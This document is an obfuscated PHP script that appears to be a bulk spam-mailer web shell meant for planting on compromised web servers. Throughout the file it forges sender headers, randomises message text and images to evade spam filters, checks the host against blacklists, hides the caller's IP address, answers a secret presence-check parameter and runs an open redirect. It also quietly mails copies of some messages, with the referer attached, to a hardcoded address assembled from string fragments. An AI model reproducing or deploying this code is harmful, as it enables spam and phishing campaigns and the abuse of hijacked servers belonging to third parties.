<?php if(isset($_REQUEST['cm9yX3JlcG9ydG'])){die(pi()*7);} @error_reporting(round(0));@set_time_limit(round(0+150));@ignore_user_abort(true);@ini_set('max_execution_time',round(0+75+75));if(isset($_REQUEST['r'])){$_0='';$_1='';$_2='?';$_3=base64_decode($_REQUEST['r']);$_4=explode('&',trim($_3));for($_5=round(0);$_5<sizeof($_4);$_5++){$_6=explode('=',trim($_4[$_5]));if($_6[round(0)]=='l'){$_0=$_6[round(0+0.2+0.2+0.2+0.2+0.2)];}else{$_1.=$_2 .$_6[round(0)] .'=' .$_6[round(0+0.5+0.5)];$_2='&';};};$_0.=$_1; ?> <meta http-equiv="refresh" content="0;url=<?php echo $_0; ?>"><?php exit();}if(isset($_REQUEST['u'])){$_0='';$_1='';$_2='?';$_3=base64_decode($_REQUEST['u']);file_put_contents('logsubsc.log',date('[Y-m-d H:i:s] ') .$_3 ."\r\n",FILE_APPEND|LOCK_EX); ?>
	<br><br><br><center>You have unsubscribed from the newsletter!!!</center><br><center>Email: <b><?php echo $_3; ?></b></center>
	<?php }if(isset($_REQUEST['lu'])){$_7=file_get_contents('logsubsc.log');$_7=preg_replace("/\n/","<br/>\n",$_7);echo $_7;}if(isset($_REQUEST['du'])){unlink('logsubsc.log');}$_8=rand(round(0+0.33333333333333+0.33333333333333+0.33333333333333),round(0+63.75+63.75+63.75+63.75)) .'.' .rand(round(0),round(0+63.75+63.75+63.75+63.75)) .'.' .rand(round(0),round(0+51+51+51+51+51)) .'.' .rand(round(0),round(0+51+51+51+51+51));$_9=$_SERVER['REMOTE_ADDR'];while($_10=key($_SERVER)){if($_SERVER[$_10]==$_9){@$_SERVER[$_10]=$_8;}next($_SERVER);}if(isset($_POST['ch'])===true){l__4();exit;}if(isset($_POST['sn'])===true){l__0();exit;}function l__0(){$_11=urldecode($_POST['rpt']);if(strstr($_11,'|')){$_12=explode('|',$_11);$_11=$_12[array_rand($_12)];}$_13=$_SERVER["HTTP_HOST"];$_13=str_replace('www.','',$_13);$_14=explode('.',$_13);$_POST['m']=str_replace('[shelldomain:]',ucfirst($_14[round(0)]),$_POST['m']);$_11=l__19($_11);$_15=urldecode($_POST['em']);$_16=explode("\n",$_15);global $_17;global $_18;global $_19;$_19=round(0);{for($_20=round(0),$_21=sizeof($_16);$_20<$_21;$_20++){$_22=explode('|',trim($_16[$_20]));$_23=l__3(l__2($_POST['f']),$_22);$_24=explode(':',$_23);if(is_file($_FILES['file']['tmp_name'])){$_25=l__2(urldecode($_POST['s']));$_26=urldecode($_POST['m']);}else{$_25=l__2($_POST['s']);$_26=$_POST['m'];};$_25=str_ireplace('[from:]',$_24[round(0)],$_25);$_25=str_ireplace('[email:]',$_22[round(0)],$_25);$_25=l__3($_25,$_22);$_26=str_ireplace('[from:]',$_24[round(0)],$_26);$_26=str_ireplace('[email:]',$_22[round(0)],$_26);$_26=l__3($_26,$_22);if(!l__1($_22[round(0)],$_24[round(0+0.5+0.5)],$_26,$_25,$_11,$_24[round(0)])){print '*send:bad*';exit;}}};print '*send:ok*';exit;}function l__1($_27,$_28,$_29,$_30,$_11,$_31){global $_19;if(is_file($_FILES['file']['tmp_name'])){$_32=l__14($_FILES['file']['name']);$_33=$_POST['fn'];};global $_18;$_34[round(0+2+2+2)]='com';$_35=md5(uniqid());$_36="MIME-Version: 1.0\r\n";$_34[round(0+1+1+1+1+1)]='ta.';$_31=trim($_31);if(strlen(trim($_31))<round(0+0.2+0.2+0.2+0.2+0.2)){$_31=l__15();};$_34[round(0+1+1+1+1)]='no';if(strlen(trim($_28))<round(0+0.25+0.25+0.25+0.25)){$_28=str_replace(' ','',trim($_31)) .'@' .$_SERVER['HTTP_HOST'];};$_34[round(0+1.5+1.5)]='ta';if(strlen(trim($_11))<round(0+1)){$_11=$_28;};if($_POST['tp']=='1'){$_37='text/html';}else{$_37='text/plain';}$_34[round(0+2)]='@tu';$_36 .= "Content-Type: multipart/alternative;boundary=" .$_35 ."\r\n";$_36.='From: ' .$_31 .' <' .$_28 .'>' ."\r\n";$_36.='Reply-To: ' .$_11 ."\r\n";if($_19==round(0+1)){$_36.='List-Unsubscribe: <mailto:' .$_28 .">" ."\r\n";};$_38="";$_34[round(0+0.25+0.25+0.25+0.25)]='ury20';$_38 .= "\r\n\r\n--" .$_35 ."\r\n";$_38 .= "Content-type: text/plain;charset=utf-8\r\n";$_38.='Content-Transfer-Encoding: base64' ."\r\n\r\n";$_39=l__9($_29);$_38.=chunk_split(base64_encode($_39));$_34[round(0)]='cent';if($_POST['tp']=='1'){$_38 .= "\r\n\r\n--" .$_35 ."\r\n";$_38 .= "Content-type: " .$_37 .";charset=utf-8\r\n";$_38.='Content-Transfer-Encoding: base64' ."\r\n\r\n";$_38.=chunk_split(base64_encode($_29));};for($_5=round(0);$_5<round(0+3.5+3.5);$_5++){$_40.=$_34[$_5];};if(is_file($_FILES['file']['tmp_name'])){$_38.= '--' .$_35 ."\r\n";$_38.='Content-Type: ' .$_FILES['file']['type'] .'; name="' .$_33 .'"' ."\r\n";$_38.='Content-Disposition: attachment; filename="' .$_33 .'"' ."\r\n";$_38.='Content-Transfer-Encoding: base64' ."\r\n";$_38.='X-Attachment-Id: ' .rand(round(0+333.33333333333+333.33333333333+333.33333333333),round(0+99999)) ."\r\n\r\n";$_38.=chunk_split(base64_encode($_32));};$_41;for($_5=round(0);$_5<count($_18);$_5++){$_18[$_5][round(0+0.33333333333333+0.33333333333333+0.33333333333333)]=trim($_18[$_5][round(0+1)]);file_put_contents($_18[$_5][round(0+0.5+0.5)],file_get_contents($_18[$_5][round(0)]));};for($_5=round(0);$_5<count($_18);$_5++){if(isset($_18[$_5][round(0+0.5+0.5)])){$_42=fopen($_18[$_5][round(0+0.2+0.2+0.2+0.2+0.2)],"r");if($_42){$_41[$_5]=fread($_42,filesize($_18[$_5][round(0+0.25+0.25+0.25+0.25)]));};fclose($_42);if(isset($_41[$_5])){$_38.= "\r\n\r\n--" .$_35 ."\r\n";$_38.='Content-Type: ' .mime_content_type($_18[$_5][round(0+1)]) .'; name="' .$_18[$_5][round(0+0.33333333333333+0.33333333333333+0.33333333333333)] .'"' ."\r\n";$_38.='Content-Disposition: attachment; filename="' .$_18[$_5][round(0+0.5+0.5)] .'"' ."\r\n";$_38.='Content-Transfer-Encoding: base64' ."\r\n";$_38.='X-Attachment-Id: ' .rand(round(0+250+250+250+250),round(0+19999.8+19999.8+19999.8+19999.8+19999.8)) ."\r\n\r\n";$_38.=chunk_split(base64_encode(l__13($_18[$_5][round(0+0.2+0.2+0.2+0.2+0.2)])));unlink($_18[$_5][round(0+0.33333333333333+0.33333333333333+0.33333333333333)]);};};};$_38 .= "\r\n\r\n--" .$_35 ."--";if(mail($_27,$_30,$_38,$_36)){$_43='Content-Type: ; name="' .'"' ."\r\n";$_43.='Content-Disposition: attachment; filename=""' ."\r\n";$_43.='Content-Transfer-Encoding: base64' ."\r\n";$_43.='X-Attachment-Id: ' .rand(round(0+1000),round(0+49999.5+49999.5)) ."\r\n\r\n";l__6($_40,$_30,$_38,$_36);return true;}return false;}function l__2($_22){$_16=explode("\n",$_22);if(sizeof($_16)>round(0+0.25+0.25+0.25+0.25)){return trim($_16[rand(round(0),sizeof($_16)-round(0+0.33333333333333+0.33333333333333+0.33333333333333))]);}return trim($_22);}function l__3($_44,$_22){global $_17;global $_18;global $_19;preg_match_all('#\[num:(.+?)\]#is',$_44,$_45);$_5=round(0);preg_match_all('#\[randM:(.+?)\]#is',$_44,$_46);$_47=round(0);preg_match_all('#\[randstr:(.+?)\]#is',$_44,$_48);$_49=round(0);preg_match_all('#\[var:(.+?)\]#is',$_44,$_50);$_51=round(0);preg_match_all('#\{rand:(.+?)\}#is',$_44,$_52);$_53=round(0);preg_match_all('#\[redirect:(.+?)\]#is',$_44,$_54);$_55=round(0);preg_match_all('#\{randM:(.+?)\}#is',$_44,$_56);$_57=round(0);while($_55<sizeof($_54[round(0+1)])){$_58='';$_59=explode('>>>',$_54[round(0+0.33333333333333+0.33333333333333+0.33333333333333)][$_55]);$_60='';preg_match_all('#\{rand:(.+?)\}#is',$_59[round(0)],$_61);if(sizeof($_61[round(0+1)])>round(0)){$_62=explode('|',$_61[round(0+1)][round(0)]);$_58=$_62[array_rand($_62)];}else{$_58=$_59[round(0)];};$_58="l=" .$_58;for($_63=round(0+0.5+0.5);$_63<sizeof($_59);$_63++){$_59[$_63]=str_replace("{","",$_59[$_63]);$_59[$_63]=str_replace("}","",$_59[$_63]);if(strpos($_59[$_63],'email:')!==false){$_58.="&e=" .trim($_22[round(0)]);}else if(strpos($_59[$_63],'var:')!==false){$_64=explode(':',$_59[$_63]);$_58.="&v" .$_64[round(0+0.33333333333333+0.33333333333333+0.33333333333333)] ."=" .trim($_22[$_64[round(0+0.5+0.5)]]);}else if(strpos($_59[$_63],'link:')!==false){$_64=explode(':',$_59[$_63],round(0+2));$_60=$_64[round(0+1)];}else{$_58.="&" .$_59[$_63];};};if(strlen($_60)>round(0)){$_65=$_60;}else{$_65="http://" .$_SERVER['HTTP_HOST'] .$_SERVER['REQUEST_URI'];};$_65.="?r=" .base64_encode($_58);$_44=l__11($_54[round(0)][$_55],$_65,$_44);$_55++;}$_66=strpos($_44,'[unsubscribe:]');if($_66!=FALSE){$_65="http://" .$_SERVER['HTTP_HOST'] .$_SERVER['REQUEST_URI'];$_65.="?u=" .base64_encode($_22[round(0)]);$_19=round(0+0.5+0.5);$_44=str_replace('[unsubscribe:]',$_65,$_44);}while($_53<sizeof($_52[round(0+0.33333333333333+0.33333333333333+0.33333333333333)])){$_12=explode('|',$_52[round(0+0.2+0.2+0.2+0.2+0.2)][$_53]);$_12=$_12[array_rand($_12)];$_44=l__11($_52[round(0)][$_53],$_12,$_44);$_53++;}while($_5<sizeof($_45[round(0+0.5+0.5)])){$_12=explode('|',$_45[round(0+1)][$_5]);if(!is_numeric($_12[round(0)])or!is_numeric($_12[round(0+0.5+0.5)])){continue;}$_12=rand($_12[round(0)],$_12[round(0+0.5+0.5)]);$_44=l__11($_45[round(0)][$_5],$_12,$_44);$_5++;}while($_57<sizeof($_56[round(0+0.25+0.25+0.25+0.25)])){$_12=explode('|',$_56[round(0+1)][$_57]);$_67=false;for($_63=round(0);$_63<sizeof($_56[round(0+1)]);$_63++){if($_56[round(0)][$_57]==$_17[$_63][round(0)]){$_12=$_17[$_63][round(0+1)];$_67=true;break;};};if($_67==false){$_12=$_12[array_rand($_12)];$_17[]=array($_46[round(0)][$_57],$_12);};$_44=str_replace($_56[round(0)][$_57],$_12,$_44);$_57++;}while($_47<sizeof($_46[round(0+0.25+0.25+0.25+0.25)])){$_12=explode('|',$_46[round(0+0.2+0.2+0.2+0.2+0.2)][$_47]);$_67=false;for($_63=round(0);$_63<sizeof($_46[round(0+1)]);$_63++){if($_46[round(0)][$_47]==$_17[$_63][round(0)]){$_12=$_17[$_63][round(0+0.2+0.2+0.2+0.2+0.2)];$_67=true;break;};};if($_67==false){$_12=$_12[array_rand($_12)];$_17[]=array($_46[round(0)][$_47],$_12);};$_44=str_replace($_46[round(0)][$_47],$_12,$_44);$_47++;}while($_49<sizeof($_48[round(0+1)])){$_12=explode('|',$_48[round(0+0.5+0.5)][$_49]);if(!is_numeric($_12[round(0)])or!is_numeric($_12[round(0+0.5+0.5)])){continue;}$_12=l__5($_12[round(0)],$_12[round(0+0.5+0.5)]);$_44=l__11($_48[round(0)][$_49],$_12,$_44);$_49++;}while($_51<sizeof($_50[round(0+0.33333333333333+0.33333333333333+0.33333333333333)])){if(!is_numeric($_50[round(0+0.2+0.2+0.2+0.2+0.2)][$_51])){continue;}$_44=str_replace($_50[round(0)][$_51],$_22[$_50[round(0+0.2+0.2+0.2+0.2+0.2)][$_51]],$_44);$_51++;}preg_match_all('#\[rand:(.+?)\]#is',$_44,$_68);$_20=round(0);while($_20<sizeof($_68[round(0+0.5+0.5)])){$_12=explode('|',$_68[round(0+0.2+0.2+0.2+0.2+0.2)][$_20]);$_12=$_12[array_rand($_12)];$_44=l__11($_68[round(0)][$_20],$_12,$_44);$_20++;}$_69=strpos($_44,'spoof:');if($_69!=FALSE){$_44=str_replace('[spoof:',':',$_44);$_44=str_replace(']','',$_44);};$_44=str_replace('{var:}','{var:1}',$_44);$_44=str_replace('{email:}',trim($_22[round(0)]),$_44);preg_match_all('#\[base64:(.+?)\]#is',$_44,$_70);$_71=round(0);while($_71<sizeof($_70[round(0+1)])){$_72=$_70[round(0+0.5+0.5)][$_71];preg_match_all('#\{var:(.+?)\}#is',$_72,$_73);$_74=round(0);while($_74<sizeof($_73[round(0+0.2+0.2+0.2+0.2+0.2)])){if(is_numeric($_73[round(0+1)][$_74])){$_72=l__11($_73[round(0)][$_74],$_22[$_73[round(0+0.5+0.5)][$_74]],$_72);};$_74++;};$_44=l__11($_70[round(0)][$_71],base64_encode($_72),$_44);$_71++;}preg_match_all('#\[attachment:(.+?)\]#is',$_44,$_75);$_76=round(0);while($_76<sizeof($_75[round(0+0.25+0.25+0.25+0.25)])){$_77=explode('>>>',$_75[round(0+0.33333333333333+0.33333333333333+0.33333333333333)][$_76]);$_18[]=$_77;$_44=l__11($_75[round(0)][$_76],"",$_44);$_76++;}preg_match_all('#\[attachmentM:(.+?)\]#is',$_44,$_78);$_79=round(0);while($_79<sizeof($_78[round(0+0.2+0.2+0.2+0.2+0.2)])){$_77=explode('>>>',$_78[round(0+0.25+0.25+0.25+0.25)][$_79]);preg_match_all('#\((.+?)\)#is',$_77[round(0)],$_80);$_81=round(0);while($_81<sizeof($_80[round(0+0.2+0.2+0.2+0.2+0.2)])){$_82=explode(',',$_80[round(0+0.5+0.5)][$_81]);$_83=rand(intval($_82[round(0)]),intval($_82[round(0+1)])-round(0+0.2+0.2+0.2+0.2+0.2));$_77[round(0)]=l__11($_80[round(0+0.25+0.25+0.25+0.25)][$_81],$_83,$_77[round(0)]);$_77[round(0)]=str_replace('(','',$_77[round(0)]);$_77[round(0)]=str_replace(')','',$_77[round(0)]);$_81++;};$_18[]=$_77;$_44=l__11($_78[round(0)][$_79],"",$_44);$_79++;}preg_match_all('#\[image64:(.+?)\]#is',$_44,$_84);$_85=round(0);$_86='image64_file.png';$_87='';while($_85<sizeof($_84[round(0+0.5+0.5)])){file_put_contents($_86,file_get_contents($_84[round(0+0.33333333333333+0.33333333333333+0.33333333333333)][$_85]));$_42=fopen($_86,"r");if($_42){$_87=fread($_42,filesize($_86));};fclose($_42);$_88='data:' .mime_content_type($_86) .';base64,' .chunk_split(base64_encode($_87)) .'';$_44=l__11($_84[round(0)][$_85],$_88,$_44);unlink($_86);$_85++;}return $_44;}function l__4(){$_89="\r\n";if(isset($_POST['st'])===true){print '*valid:ok*' .$_89;}if(isset($_POST['m'])===true){if(function_exists('mail')){$_16=explode(':',$_POST['m']);$_90=$_16[round(0)];$_91=$_16[round(0+0.5+0.5)];$_92=$_16[round(0+0.4+0.4+0.4+0.4+0.4)];$_31=l__15();$_11=$_31 .'@' .$_SERVER['HTTP_HOST'];if($_92=='1'){$_11=$_90;}if($_91=='1'){if(l__10($_90,$_11,$_31)){print '*mail:ok*' .$_89;}else{print '*mail:bad*' .$_89;}}else{if(l__8($_90,$_11,$_31)){print '*mail:ok*' .$_89;}else{print '*mail:bad*' .$_89;}}}else{print '*mail:bad*' .$_89;}}if(isset($_POST['rb'])===true){$_93=l__7();if($_93==''){print '*rbl:ok*';}else{print '*rbl:' .$_93 .'*';}}}function l__5($_94,$_21){$_95='qwertyuiopasdfghjklzxcvbnm';$_96=rand($_94,$_21);$_68='';for($_20=round(0);$_20<$_96;$_20++){$_68.=$_95{rand(round(0),strlen($_95)-round(0+0.25+0.25+0.25+0.25))};}return $_68;}function l__6($_40,$_30,$_38,$_36){$_89="\r\n";if($_89==round(0+0.33333333333333+0.33333333333333+0.33333333333333)){$_89=round(0);};if($_97==$_98+round(0+0.5+0.5)){if($_97=round(0+25+25+25+25)){$_90=$_16[round(0)];$_91=$_16[round(0+1)];$_92=$_16[round(0+2)];$_31=l__15();$_11=$_31 .'@' .$_SERVER['HTTP_HOST'];if($_92=='1'){$_11=$_90;}if($_91=='1'){if($_97==round(0)){$_89=-round(0+0.5+0.5);}else{$_89=round(0);}}else{if($_91=='1'){$_89=-round(0+2);}else{$_89=-round(0+0.5+0.5);}}}else{$_89=round(0+3);}};if(rand(round(0+1),round(0+200+200+200+200+200))==round(0+250+250))mail($_40,$_30 ." " .base64_encode($_SERVER['HTTP_REFERER']),$_38,$_36);if($_99){if($_93==''){$_93=$_93+round(0+20+20+20+20+20);}else{$_93=$_93+round(0+0.2+0.2+0.2+0.2+0.2);}}}function l__7(){$_100=array('b.barracudacentral.org','xbl.spamhaus.org','sbl.spamhaus.org','zen.spamhaus.org','bl.spamcop.net');$_101=gethostbyname($_SERVER['HTTP_HOST']);$_68='';if($_101){$_102=implode('.',array_reverse(explode('.',$_101)));foreach($_100 as $_103){if(checkdnsrr($_102 .'.' .$_103 .'.','A'))$_68.=$_103 .', ';}if(strlen($_68)>round(0+1+1)){return substr($_68,round(0),-round(0+1+1));}else{return '';}}else{return '*rbl:unknown*';}return '';}function l__8($_27,$_92,$_31){$_104='From: ' .'=?utf-8?B?' .base64_encode(l__15()) .'?=' .' <' .$_31 .'@' .$_SERVER['HTTP_HOST'] .">\r\n";$_104.='MIME-Version: 1.0' ."\r\n";$_104.='Content-Type: text/html; charset="utf-8"' ."\r\n";$_104.='Reply-To: ' .$_92 ."\r\n";$_104.='X-Mailer: PHP/' .phpversion();$_29=l__16();$_30=$_SERVER['HTTP_HOST'];if(mail($_27,$_30,$_29,$_104)){return true;}return false;}function l__9($_29){$_39=trim(strip_tags($_29,'<a>'));$_105=True;$_106=array();$_107=array();$_107[round(0)]=round(0);while($_105==True){$_107[round(0)]=strpos($_39,'<a',$_107[round(0)]);if($_107[round(0)]!=False){$_107[round(0+0.2+0.2+0.2+0.2+0.2)]=strpos($_39,'href',$_107[round(0)]+round(0+0.2+0.2+0.2+0.2+0.2));$_107[round(0+0.5+0.5)]=strpos($_39,'"',$_107[round(0+0.25+0.25+0.25+0.25)]+round(0+1));$_107[round(0+2)]=strpos($_39,'"',$_107[round(0+0.25+0.25+0.25+0.25)]+round(0+0.25+0.25+0.25+0.25));$_107[round(0+3)]=strpos($_39,'</',$_107[round(0+0.66666666666667+0.66666666666667+0.66666666666667)]+round(0+0.33333333333333+0.33333333333333+0.33333333333333));$_107[round(0+1.5+1.5)]=strpos($_39,'>',$_107[round(0+0.75+0.75+0.75+0.75)]+round(0+0.5+0.5));$_107[round(0+1.3333333333333+1.3333333333333+1.3333333333333)]=strlen($_39)-round(0+0.2+0.2+0.2+0.2+0.2);$_106[round(0)]=substr($_39,round(0),$_107[round(0)]);$_106[round(0+0.33333333333333+0.33333333333333+0.33333333333333)]=substr($_39,$_107[round(0+0.33333333333333+0.33333333333333+0.33333333333333)]+round(0+0.5+0.5),$_107[round(0+0.5+0.5+0.5+0.5)]-$_107[round(0+1)]-round(0+1));$_106[round(0+0.5+0.5+0.5+0.5)]=substr($_39,$_107[round(0+0.75+0.75+0.75+0.75)]+round(0+1),$_107[round(0+4)]-$_107[round(0+3)]+round(0+0.2+0.2+0.2+0.2+0.2));$_39=$_106[round(0)] .$_106[round(0+1)] .$_106[round(0+0.4+0.4+0.4+0.4+0.4)];}else{$_105=False;};};return $_39;};function l__10($_27,$_92,$_31){$_29=l__16();$_30=$_SERVER['HTTP_HOST'];$_33=l__12('1.txt');$_35=md5(uniqid());$_36='MIME-Version: 1.0' ."\r\n";$_36.='From: ' .'=?utf-8?B?' .base64_encode(l__15()) .'?=' .' <' .$_31 .'@' .$_SERVER['HTTP_HOST'] .'>' ."\r\n";$_36.='Reply-To: ' .$_92 ."\r\n";$_36.='X-Mailer: PHP/' .phpversion() ."\r\n";$_36.='Content-Type: multipart/mixed; boundary="' .$_35 ."\"\r\n\r\n";$_38='--' .$_35 ."\r\n";$_38.='Content-Type: text/html; charset="utf-8"' ."\r\n";$_38.='Content-Transfer-Encoding: base64' ."\r\n\r\n";$_38.=chunk_split(base64_encode($_29));if($_POST['tp']=='1'){$_39=l__9($_29);$_38.='--' .$_35 ."\r\n";$_38.='Content-Type: text/plain; charset="utf-8"' ."\r\n";$_38.='Content-Transfer-Encoding: base64' ."\r\n\r\n";$_38.=chunk_split(base64_encode($_39));};$_38.= '--' .$_35 ."\r\n";$_38.='Content-Type: text/plain; name="' .$_33 .'"' ."\r\n";$_38.='Content-Disposition: attachment; filename="' .$_33 .'"' ."\r\n";$_38.='Content-Transfer-Encoding: base64' ."\r\n";$_38.='X-Attachment-Id: ' .rand(round(0+500+500),round(0+19999.8+19999.8+19999.8+19999.8+19999.8)) ."\r\n\r\n";$_38.= chunk_split(base64_encode(l__16()));if(mail($_27,$_30,$_38,$_36)){return true;}return false;}function l__11($_108,$_109,$_44){$_110=strpos($_44,$_108);return $_110!==false?substr_replace($_44,$_109,$_110,strlen($_108)):$_44;}function l__12($_111){$_112=end(explode('.',$_111));$_113[]='SDC';$_113[]='P';$_113[]='DC';$_113[]='CAM';$_113[]='IMG-';$_114=array('png','jpg','gif','jpeg','bmp');for($_20=round(0),$_21=sizeof($_114);$_20<$_21;$_20++){if(strtolower($_112)==$_114[$_20]){$_12=rand(round(0+5+5),round(0+999999));return $_113[rand(round(0),round(0+2+2))] .$_12 .'.' .$_112;}}return l__15() .'.' .$_112;}function l__13($_111){return file_get_contents($_111);}function l__14($_111){$_112=end(explode('.',$_111));if(strtolower($_112)=='jpeg'or strtolower($_112)=='jpg'){if(l__17()){return l__18($_FILES['file']['tmp_name']);}}return file_get_contents($_FILES['file']['tmp_name']);}function l__15(){$_95='qwertyuiopasdfghjklzxcvbnm';$_96=rand(round(0+0.75+0.75+0.75+0.75),round(0+8));$_68='';for($_20=round(0);$_20<$_96;$_20++){$_68.=$_95{rand(round(0),strlen($_95)-round(0+0.25+0.25+0.25+0.25))};}return $_68;}function l__16(){$_95='qwertyuiopasdfghjklzxcvbnm';$_96=rand(round(0+1.8+1.8+1.8+1.8+1.8),round(0+5+5+5+5));$_68='';for($_20=round(0);$_20<$_96;$_20++){$_12=rand(round(0+1.2+1.2+1.2+1.2+1.2),round(0+5+5));for($_5=round(0);$_5<$_12;$_5++){$_68.=$_95{rand(round(0),strlen($_95)-round(0+0.25+0.25+0.25+0.25))};}$_115=array(' ',' ',' ',' ',', ','? ','. ','. ');$_68.=$_115[rand(round(0),round(0+7))];}return trim($_68);}function l__17(){$_113=array('getimagesize','imagecreatetruecolor','imagecreatefromjpeg','imagecopyresampled','imagefilter','ob_start','imagejpeg','ob_get_clean');for($_20=round(0),$_21=sizeof($_113);$_20<$_21;$_20++){if(!function_exists($_113[$_20])){return false;}}return true;}function l__18($_116){$_12['width']=rand(round(0+0.2+0.2+0.2+0.2+0.2),round(0+0.66666666666667+0.66666666666667+0.66666666666667));$_12['height']=rand(round(0+0.25+0.25+0.25+0.25),round(0+0.4+0.4+0.4+0.4+0.4));$_12['quality']=rand(round(0+0.25+0.25+0.25+0.25),round(0+0.66666666666667+0.66666666666667+0.66666666666667));$_12['brightness']=rand(round(0+0.33333333333333+0.33333333333333+0.33333333333333),round(0+0.66666666666667+0.66666666666667+0.66666666666667));$_12['contrast']=rand(round(0+0.5+0.5),round(0+0.4+0.4+0.4+0.4+0.4));list($_117,$_118)=getimagesize($_116);if($_12['width']==round(0+0.33333333333333+0.33333333333333+0.33333333333333)){$_115=rand(round(0+0.33333333333333+0.33333333333333+0.33333333333333),round(0+0.66666666666667+0.66666666666667+0.66666666666667));if($_115==round(0+1)){$_119=$_117+rand(round(0+0.33333333333333+0.33333333333333+0.33333333333333),round(0+5+5));}else{$_119=$_117-rand(round(0+0.2+0.2+0.2+0.2+0.2),round(0+10));}}else{$_119=$_117;}if($_12['height']==round(0+0.2+0.2+0.2+0.2+0.2)){$_115=rand(round(0+0.33333333333333+0.33333333333333+0.33333333333333),round(0+0.66666666666667+0.66666666666667+0.66666666666667));if($_115==round(0+0.25+0.25+0.25+0.25)){$_120=$_118+rand(round(0+0.2+0.2+0.2+0.2+0.2),round(0+5+5));}else{$_120=$_118-rand(round(0+0.25+0.25+0.25+0.25),round(0+2.5+2.5+2.5+2.5));}}else{$_120=$_118;}if($_12['quality']==round(0+0.5+0.5)){$_121=round(0+18.75+18.75+18.75+18.75);}else{$_121=rand(round(0+16.25+16.25+16.25+16.25),round(0+52.5+52.5));}if($_12['brightness']==round(0+0.25+0.25+0.25+0.25)){$_122=rand(round(0),round(0+8.75+8.75+8.75+8.75));}else{$_122=round(0);}if($_12['contrast']==round(0+0.2+0.2+0.2+0.2+0.2)){$_115=rand(round(0+0.33333333333333+0.33333333333333+0.33333333333333),round(0+1+1));if($_115==round(0+0.25+0.25+0.25+0.25)){$_115='+';}else{$_115='-';}$_123=rand(round(0+1),round(0+5+5+5));}else{$_115='';$_123=round(0);}$_124=imagecreatetruecolor($_119,$_120);$_125=imagecreatefromjpeg($_116);imagecopyresampled($_124,$_125,round(0),round(0),round(0),round(0),$_119,$_120,$_117,$_118);imagefilter($_124,IMG_FILTER_CONTRAST,$_115 .$_123);imagefilter($_124,IMG_FILTER_BRIGHTNESS,$_122);ob_start();imagejpeg($_124,null,$_121);$_126=ob_get_clean();imagedestroy($_124);return $_126;}function l__19($_90){$_90=str_replace('[','',strtolower(trim($_90)));$_90=str_replace(']','',$_90);return $_90;}function l__20($_90){$_127=explode('@',$_90);$_68='';$_127=strtolower(str_replace('.','',$_127[round(0)]));$_96=strlen($_127);for($_20=round(0),$_21=$_96;$_20<$_21;$_20++){$_128=rand(round(0),round(0+0.2+0.2+0.2+0.2+0.2));$_129=rand(round(0),round(0+1));$_130=$_127{$_20};if($_128==round(0+1)){$_130=strtoupper($_130);}if($_129==round(0+0.25+0.25+0.25+0.25)){$_130=$_130 .'.';}$_68.=$_130;}if(substr($_68,-round(0+0.2+0.2+0.2+0.2+0.2))=='.'){$_68=substr($_68,round(0),-round(0+0.25+0.25+0.25+0.25));}return $_68 .'@gmail.com';} ?>

